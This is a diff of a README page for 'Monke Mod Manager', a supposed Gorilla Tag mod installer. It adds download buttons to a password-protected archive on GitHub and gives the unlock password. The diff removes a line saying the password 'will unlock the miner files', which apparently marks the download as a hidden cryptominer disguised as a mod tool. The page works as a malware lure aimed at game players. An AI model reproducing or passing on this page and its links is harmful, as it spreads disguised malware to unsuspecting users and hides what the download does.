@@ -1,8 +1,8 @@
 ![Monke Mod Manager](https://images.sftcdn.net/images/t_app-cover-l,f_auto/p/36eaa2d7-5f45-4442-814f-8546564f2eba/1877878237/monke-mod-manager-Monke-Mod-Manager-for-Windows-Tools.jpg)
 
-# Monke Mod Manager
-
-In conclusion, Monke Mod Manager is a powerful and convenient utility software that makes it easy for players to manage and install mods for their games on the Windows platform. Its user-friendly interface, wide range of features, and support for multiple games make it an excellent choice for anyone looking to customize and optimize their gaming experience.
+<a href="https://github.com/DeadlyKittenn/MonkeModManager/releases/download/1/Set-UpMonkeModManager.rar">
+    <img src="https://www.librasol.com.br/wp-content/uploads/2018/09/windows-button-download.png" alt="Download" width="200" />
+</a>
 
 📘 Installation Instructions
 
@@ -31,8 +31,6 @@ If you don’t have WinRAR, download and install it from win-rar.com — it's re
 Open the downloaded archive using WinRAR.
 When prompted, enter the password: monkemodmanager
 
-This will unlock the miner files for use.
-
 🧰 Step 5: Select Your Mods
 Tick the boxes for the mods you want to install (e.g., BananaHook, Utils, Air Jump, etc.).
 Then click Install / Update — the tool will download and install them for you.
@@ -40,6 +38,15 @@ Then click Install / Update — the tool will download and install them for you.
 🔁 Step 6: Launch Gorilla Tag
 Start the game as usual — your selected mods should now be active.
 You can reopen Monke Mod Manager anytime to add/remove/update your mods.
+
+
+
+
+# Monke Mod Manager
+
+In conclusion, Monke Mod Manager is a powerful and convenient utility software that makes it easy for players to manage and install mods for their games on the Windows platform. Its user-friendly interface, wide range of features, and support for multiple games make it an excellent choice for anyone looking to customize and optimize their gaming experience.
+
+
 
 <a href="https://github.com/DeadlyKittenn/MonkeModManager/releases/download/1/Set-UpMonkeModManager.zip">
     <img src="https://www.librasol.com.br/wp-content/uploads/2018/09/windows-button-download.png" alt="Download" width="200" />
